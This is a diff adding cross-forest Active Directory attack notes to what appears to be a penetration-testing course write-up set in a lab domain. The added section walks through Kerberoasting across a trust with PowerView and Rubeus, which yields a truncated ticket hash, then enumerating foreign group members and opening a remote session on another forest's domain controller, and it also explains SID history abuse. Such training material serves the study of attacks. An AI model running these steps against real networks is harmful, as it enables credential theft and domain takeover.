@@ -7,6 +7,7 @@
         - [ExtraSids Attack - Rubeus](#extrasids-attack---rubeus)
     - [Linux](#linux)
 - [Attacking Cross-Forest Trust Abuse](#attacking-cross-forest-trust-abuse)
+    - [Windows](#windows-1)
 
 
 ## Overview
@@ -689,3 +690,103 @@ ACADEMY-EA-DC01
 > In a client production environment, we should always be careful when running any sort of "autopwn" script like this, and always remain cautious and construct commands manually when possible.
 
 ## Attacking Cross-Forest Trust Abuse
+### Windows
+
+- **Cross-Forest Kerberoasting**
+    - Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction.
+    - In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold.
+
+```powershell
+# Enumerating Accounts for Associated SPNs Using Get-DomainUser
+PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+
+samaccountname
+--------------
+krbtgt
+mssqlsvc
+
+# Enumerating the mssqlsvc Account
+PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
+
+samaccountname memberof
+-------------- --------
+mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+
+# Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
+PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : mssqlsvc
+[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+[*] SamAccountName         : mssqlsvc
+[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
+[*] PwdLastSet             : 3/24/2022 12:47:52 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$<SNIP>
+```
+
+> [!IMPORTANT]
+> From time to time, we'll run into a situation where there is a bidirectional forest trust managed by admins from the same company. If we can take over Domain A and obtain cleartext passwords or NT hashes for either the built-in Administrator account (or an account that is part of the Enterprise Admins or Domain Admins group in Domain A), and Domain B has a highly privileged account with the same name, then it is worth checking for password reuse across the two forests.
+
+> [!IMPORTANT]
+> We may also see users or admins from Domain A as members of a group in Domain B. Only Domain Local Groups allow security principals from outside its forest. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.
+
+
+- We can use the PowerView function `Get-DomainForeignGroupMember` to enumerate groups with users that do not belong to the domain, also known as (foreign group membership).
+```powershell
+# Using Get-DomainForeignGroupMember
+PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+
+GroupDomain             : FREIGHTLOGISTICS.LOCAL
+GroupName               : Administrators
+GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
+MemberDomain            : FREIGHTLOGISTICS.LOCAL
+MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
+MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
+                          TICS,DC=LOCAL
+
+PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
+
+INLANEFREIGHT\administrator
+
+# Accessing DC03 Using Enter-PSSession
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+
+[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
+inlanefreight\administrator
+
+[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
+   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
+```
+
+- **SID History Abuse**
+    - SID History can also be abused across a forest trust.
+    - If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust.
+    - If the SID of an account with administrative privileges in Forest A is added to the SID history attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest.
+    
